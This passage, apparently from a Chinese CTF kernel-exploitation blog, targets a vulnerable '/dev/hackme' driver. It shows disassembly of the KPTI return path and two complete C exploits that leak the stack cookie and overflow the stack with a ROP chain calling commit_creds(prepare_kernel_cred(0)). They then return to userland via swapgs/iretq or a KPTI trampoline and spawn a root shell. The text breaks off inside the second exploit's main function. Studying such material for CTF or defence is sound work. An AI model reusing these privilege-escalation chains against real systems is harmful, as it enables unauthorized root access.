class="line">.text:FFFFFFFF81200F89                               pop     rax</span><br><span class="line">.text:FFFFFFFF81200F8A                               pop     rdi</span><br><span class="line">.text:FFFFFFFF81200F8B                               call    cs:off_FFFFFFFF82040088</span><br><span class="line">.text:FFFFFFFF81200F91                               jmp     cs:off_FFFFFFFF82040080</span><br><span class="line">...</span><br><span class="line">.text.native_swapgs:FFFFFFFF8146D4E0                 push    rbp</span><br><span class="line">.text.native_swapgs:FFFFFFFF8146D4E1                 mov     rbp, rsp</span><br><span class="line">.text.native_swapgs:FFFFFFFF8146D4E4                 swapgs</span><br><span class="line">.text.native_swapgs:FFFFFFFF8146D4E7                 pop     rbp</span><br><span class="line">.text.native_swapgs:FFFFFFFF8146D4E8                 retn</span><br><span class="line">...</span><br><span class="line">.text:FFFFFFFF8120102E                               mov     rdi, cr3</span><br><span class="line">.text:FFFFFFFF81201031                               jmp     short loc_FFFFFFFF81201067</span><br><span class="line">...</span><br><span class="line">.text:FFFFFFFF81201067                               or      rdi, 1000h</span><br><span class="line">.text:FFFFFFFF8120106E                               mov     cr3, rdi</span><br><span class="line">...</span><br><span class="line">.text:FFFFFFFF81200FC7                               iretq</span><br></pre></td></tr></table></figure><p>值得注意的是，它 pop 了两个寄存器( rax &amp; rdi )，所以我们在构造 payload 的时候，要把这两个寄存器赋值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">overflow</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    payload[off++] = commit_creds; <span class="comment">// commit_creds(prepare_kernel_cred(0))</span></span><br><span class="line">    payload[off++] = kpti_trampoline; <span class="comment">// swapgs_restore_regs_and_return_to_usermode + 22</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// dummy rax</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// dummy rdi</span></span><br><span class="line">    payload[off++] = user_rip;</span><br><span class="line">    payload[off++] = user_cs;</span><br><span class="line">    payload[off++] = user_rflags;</span><br><span class="line">    payload[off++] = user_sp;</span><br><span class="line">    payload[off++] = user_ss;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="完整exp-3"><a href="#完整exp-3" class="headerlink" title="完整exp"></a>完整exp</h4><p>法一：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc 1.c -static -masm=intel -g -o 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> global_fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">open_dev</span><span class="params">()</span></span>&#123;</span><br><span class="line">    global_fd = open(<span class="string">&quot;/dev/hackme&quot;</span>, O_RDWR);</span><br><span class="line"><span class="keyword">if</span> (global_fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[!] Failed to open device&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] Opened device&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_state</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Saved state&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_leak</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> *leak, <span class="keyword">unsigned</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">unsigned</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%u: %lx\n&quot;</span>, i, leak[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> cookie;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">leak</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> n = <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> leak[n];</span><br><span class="line">    <span class="keyword">ssize_t</span> r = read(global_fd, leak, <span class="keyword">sizeof</span>(leak));</span><br><span class="line">    cookie = leak[<span class="number">16</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Leaked %zd bytes\n&quot;</span>, r);</span><br><span class="line">    <span class="comment">//print_leak(leak, n);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Cookie: %lx\n&quot;</span>, cookie);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Returned to userland&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] UID: %d, got root!\n&quot;</span>, getuid());</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] UID: %d, didn&#x27;t get root\n&quot;</span>, getuid());</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_rip = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)get_shell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> pop_rdi_ret = <span class="number">0xffffffff81006370</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> pop_rdx_ret = <span class="number">0xffffffff81007616</span>; <span class="comment">// pop rdx ; ret</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> cmp_rdx_jne_pop2_ret = <span class="number">0xffffffff81964cc4</span>; <span class="comment">// cmp rdx, 8 ; jne 0xffffffff81964cbb ; pop rbx ; pop rbp ; ret</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> mov_rdi_rax_jne_pop2_ret = <span class="number">0xffffffff8166fea3</span>; <span class="comment">// mov rdi, rax ; jne 0xffffffff8166fe7a ; pop rbx ; pop rbp ; ret</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> commit_creds = <span class="number">0xffffffff814c6410</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> prepare_kernel_cred = <span class="number">0xffffffff814c67f0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> swapgs_pop1_ret = <span class="number">0xffffffff8100a55f</span>; <span class="comment">// swapgs ; pop rbp ; ret</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> iretq = <span class="number">0xffffffff8100c0d9</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">overflow</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> n = <span class="number">50</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> payload[n];</span><br><span class="line">    <span class="keyword">unsigned</span> off = <span class="number">16</span>;</span><br><span class="line">    payload[off++] = cookie;</span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// rbx</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// r12</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// rbp</span></span><br><span class="line">    payload[off++] = pop_rdi_ret; <span class="comment">// return address</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// rdi &lt;- 0</span></span><br><span class="line">    payload[off++] = prepare_kernel_cred; <span class="comment">// prepare_kernel_cred(0)</span></span><br><span class="line">    payload[off++] = pop_rdx_ret;</span><br><span class="line">    payload[off++] = <span class="number">0x8</span>; <span class="comment">// rdx &lt;- 8</span></span><br><span class="line">    payload[off++] = cmp_rdx_jne_pop2_ret; <span class="comment">// make sure JNE doesn&#x27;t branch</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// dummy rbx</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// dummy rbp</span></span><br><span class="line">    payload[off++] = mov_rdi_rax_jne_pop2_ret; <span class="comment">// rdi &lt;- rax</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// dummy rbx</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// dummy rbp</span></span><br><span class="line">    payload[off++] = commit_creds; <span class="comment">// commit_creds(prepare_kernel_cred(0))</span></span><br><span class="line">    payload[off++] = swapgs_pop1_ret; <span class="comment">// swapgs</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// dummy rbp</span></span><br><span class="line">    payload[off++] = iretq; <span class="comment">// iretq frame</span></span><br><span class="line">    payload[off++] = user_rip;</span><br><span class="line">    payload[off++] = user_cs;</span><br><span class="line">    payload[off++] = user_rflags;</span><br><span class="line">    payload[off++] = user_sp;</span><br><span class="line">    payload[off++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Prepared payload&quot;</span>);</span><br><span class="line">    <span class="keyword">ssize_t</span> w = write(global_fd, payload, <span class="keyword">sizeof</span>(payload));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[!] Should never be reached&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    save_state();</span><br><span class="line"></span><br><span class="line">    signal(SIGSEGV, get_shell);</span><br><span class="line"></span><br><span class="line">    open_dev();</span><br><span class="line"></span><br><span class="line">    leak();</span><br><span class="line"></span><br><span class="line">    overflow();</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[!] Should never be reached&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>法二：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> global_fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">open_dev</span><span class="params">()</span></span>&#123;</span><br><span class="line">    global_fd = open(<span class="string">&quot;/dev/hackme&quot;</span>, O_RDWR);</span><br><span class="line"><span class="keyword">if</span> (global_fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[!] Failed to open device&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] Opened device&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_state</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">        <span class="string">&quot;.att_syntax;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Saved state&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_leak</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> *leak, <span class="keyword">unsigned</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">unsigned</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%u: %lx\n&quot;</span>, i, leak[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> cookie;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">leak</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> n = <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> leak[n];</span><br><span class="line">    <span class="keyword">ssize_t</span> r = read(global_fd, leak, <span class="keyword">sizeof</span>(leak));</span><br><span class="line">    cookie = leak[<span class="number">16</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Leaked %zd bytes\n&quot;</span>, r);</span><br><span class="line">    <span class="comment">//print_leak(leak, n);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Cookie: %lx\n&quot;</span>, cookie);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Returned to userland&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] UID: %d, got root!\n&quot;</span>, getuid());</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] UID: %d, didn&#x27;t get root\n&quot;</span>, getuid());</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_rip = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)get_shell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> pop_rdi_ret = <span class="number">0xffffffff81006370</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> pop_rdx_ret = <span class="number">0xffffffff81007616</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> cmp_rdx_jne_pop2_ret = <span class="number">0xffffffff81964cc4</span>; <span class="comment">// cmp rdx, 8 ; jne 0xffffffff81964cbb ; pop rbx ; pop rbp ; ret</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> mov_rdi_rax_jne_pop2_ret = <span class="number">0xffffffff8166fea3</span>; <span class="comment">// mov rdi, rax ; jne 0xffffffff8166fe7a ; pop rbx ; pop rbp ; ret</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> commit_creds = <span class="number">0xffffffff814c6410</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> prepare_kernel_cred = <span class="number">0xffffffff814c67f0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kpti_trampoline = <span class="number">0xffffffff81200f10</span> + <span class="number">22</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">overflow</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> n = <span class="number">50</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> payload[n];</span><br><span class="line">    <span class="keyword">unsigned</span> off = <span class="number">16</span>;</span><br><span class="line">    payload[off++] = cookie;</span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// rbx</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// r12</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// rbp</span></span><br><span class="line">    payload[off++] = pop_rdi_ret; <span class="comment">// return address</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// rdi &lt;- 0</span></span><br><span class="line">    payload[off++] = prepare_kernel_cred; <span class="comment">// prepare_kernel_cred(0)</span></span><br><span class="line">    payload[off++] = pop_rdx_ret;</span><br><span class="line">    payload[off++] = <span class="number">0x8</span>; <span class="comment">// rdx &lt;- 8</span></span><br><span class="line">    payload[off++] = cmp_rdx_jne_pop2_ret; <span class="comment">// make sure JNE doesn&#x27;t branch</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// dummy rbx</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// dummy rbp</span></span><br><span class="line">    payload[off++] = mov_rdi_rax_jne_pop2_ret; <span class="comment">// rdi &lt;- rax</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// dummy rbx</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// dummy rbp</span></span><br><span class="line">    payload[off++] = commit_creds; <span class="comment">// commit_creds(prepare_kernel_cred(0))</span></span><br><span class="line">    payload[off++] = kpti_trampoline; <span class="comment">// swapgs_restore_regs_and_return_to_usermode + 22</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// dummy rax</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// dummy rdi</span></span><br><span class="line">    payload[off++] = user_rip;</span><br><span class="line">    payload[off++] = user_cs;</span><br><span class="line">    payload[off++] = user_rflags;</span><br><span class="line">    payload[off++] = user_sp;</span><br><span class="line">    payload[off++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Prepared payload&quot;</span>);</span><br><span class="line">    <span class="keyword">ssize_t</span> w = write(global_fd, payload, <span class="keyword">sizeof</span>(payload));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[!] Should never be reached&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    save_state();</span><br><span class="line"></span><br><span class="line">    